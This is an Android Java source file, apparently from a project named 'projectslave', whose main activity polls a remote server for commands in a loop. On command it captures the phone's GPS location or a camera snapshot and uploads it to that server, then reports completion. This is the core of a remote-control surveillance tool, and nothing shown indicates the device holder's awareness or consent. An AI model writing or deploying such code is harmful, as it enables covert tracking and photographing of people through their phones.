package com.mobilcontrol.dev.projectslave;

import android.graphics.Bitmap;
import android.location.Location;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Base64;
import com.android.volley.Request;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.ByteArrayOutputStream;
import java.util.HashMap;
import java.util.Map;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        new Thread(new Runnable() {
            @Override
            public void run() {
                checkCommands();
            }
        }).start();
    }

    public void checkCommands(){
        MyRequest commandRequest = new MyRequest(MainActivity.this, Request.Method.GET,
                Config.baseAddress+"/mobil-control/api/command/"){
            @Override
            public void OnSuccess(int responseCode, String result){
                if(!result.isEmpty()){
                    processCommand(this, result);
                }
                else{
                    try {
                        Thread.sleep(2500);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }

                    this.processRequest();
                }
            }
        };

        commandRequest.processRequest();
    }

    public void processCommand(final MyRequest commandRequest, String result){
        JSONObject command;

        try {
            command = new JSONObject(result);

            if(command.getInt("type") == CommandType.MAP.ordinal()){
                processMap(commandRequest);
            }
            else{//CAMERA
                processCamera(commandRequest);
            }
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    public void processMap(final MyRequest commandRequest){
        new GpsLocation(MainActivity.this){
            @Override
            public void onLocationChanged(Location location) {
                this.removeListener();
                this.locationManager = null;
                Map<String,String> params = new HashMap<String, String>();
                params.put("longitude", Double.toString(location.getLongitude()));
                params.put("latitude", Double.toString(location.getLatitude()));
                MyRequest r = new MyRequest(MainActivity.this, Request.Method.POST,
                        Config.baseAddress+"/mobil-control/api/gps-coordinate/create", params) {
                    @Override
                    public void OnSuccess(int responseCode, String result) {
                        completeCommand(commandRequest);
                    }
                };

                r.processRequest();
            }
        };
    }

    public void processCamera(final MyRequest commandRequest){
        new CameraSnapshot(){
            @Override
            public void onSnapshotTaken(Bitmap bmp){
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                bmp.compress(Bitmap.CompressFormat.JPEG, 100, baos);
                byte[] imageBytes = baos.toByteArray();
                String encodedImage = Base64.encodeToString(imageBytes, Base64.DEFAULT);

                Map<String,String> params = new HashMap<String, String>();
                params.put("image", encodedImage);
                MyRequest r = new MyRequest(MainActivity.this, Request.Method.POST,
                        Config.baseAddress+"/mobil-control/api/camera-snapshot/create", params) {
                    @Override
                    public void OnSuccess(int responseCode, String result) {
                        completeCommand(commandRequest);
                    }
                };

                r.processRequest();
            }
        };
    }

    public void completeCommand(final MyRequest commandRequest){
        MyRequest r = new MyRequest(MainActivity.this, Request.Method.POST,
                Config.baseAddress+"/mobil-control/api/command/complete") {
            @Override
            public void OnSuccess(int responseCode, String result) {
                commandRequest.processRequest();//continue to check new commands
            }
        };

        r.processRequest();
    }
}
